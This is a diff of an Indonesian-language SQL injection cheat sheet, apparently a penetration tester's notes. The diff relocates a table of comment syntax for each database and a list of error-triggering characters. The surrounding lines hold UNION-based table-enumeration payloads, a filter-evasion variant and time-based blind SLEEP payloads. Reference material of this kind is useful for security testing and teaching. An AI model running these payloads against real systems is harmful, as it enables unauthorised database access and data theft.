@@ -11,6 +11,24 @@
 - Kalau value parameter yang injection kan adalah string maka mengunnakan 1='1 atau '1'='1'
 - Pada injection login, coba test inject for username dahulu, kalau tidak bisa coba inject kedua username dan password
 - Error tidak selalu menjadikan patokan bah itu celah sqli, kadang celah tersebut tidak menghasilkan error tetapi ketika kita union 'asd' malah terfeleksikan 'asd' di response body
+- Comment
+|Database|Comment|
+|---|---|
+|Oracle|`--comment`|
+|MySQL|`-- comment` `-- -comment` `; -- -comment` `#comment` `/*comment*/`(also obfuscator) `;%00`(nullbyte) `+--+/`|
+|PostgreSQL|`--comment` `/*comment*/`|
+|Microsoft|`--comment` `/*comment*/`|
+- Generate error 
+```
+<spasi_kosong>
+'
+')
+'))
+" / ") / "))
+`
+`)
+`))
+```
 
 ## langkah-langkah
 1. Identifikasi DB yang digunakan, generate error atau show @@database
@@ -36,26 +54,6 @@
 |`UNION SELECT asd`|`UNION SELECT` <br> `'UNION ALL SELECT` <br> `') uZEROFILLnZEROFILLiZEROFILLoZEROFILLn sZEROFILLeZEROFILLlZEROFILLeZEROFILLcZEROFILLt 'PoC'; -- -`|
 |`+UNION+SELECT+1,2,(table_name),4,5+from+information_schema.tables--+`|`union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=database()—`<br>`'union(select('asd');# ->digunakan ketika comment diblok` <br> `union(select(group_concat(table_name))from(information_schema.columns/tables)where(table_schema=database()));#`<br>`union select group_concat(table_name) from information_schema.tables where table_schema=schema(); —- - (MySQL)`|
 |' AND (SELECT 9160 FROM (SELECT(SLEEP(1-(IF(2085>2084,0,5)))))htyF) AND 'SyEv'='SyEv|' AND (SELECT 2484 FROM (SELECT(SLEEP(5)))wMTT) AND 'pbuG'='pbuG|
-
-
-|Database|Comment|
-|---|---|
-|Oracle|`--comment`|
-|MySQL|`-- comment` `-- -comment` `; -- -comment` `#comment` `/*comment*/`(also obfuscator) `;%00`(nullbyte) `+--+/`|
-|PostgreSQL|`--comment` `/*comment*/`|
-|Microsoft|`--comment` `/*comment*/`|
-
-## Generate Error
-```
-<spasi_kosong>
-'
-')
-'))
-" / ") / "))
-`
-`)
-`))
-```
 
 ## Writeups
 |Title|Description|
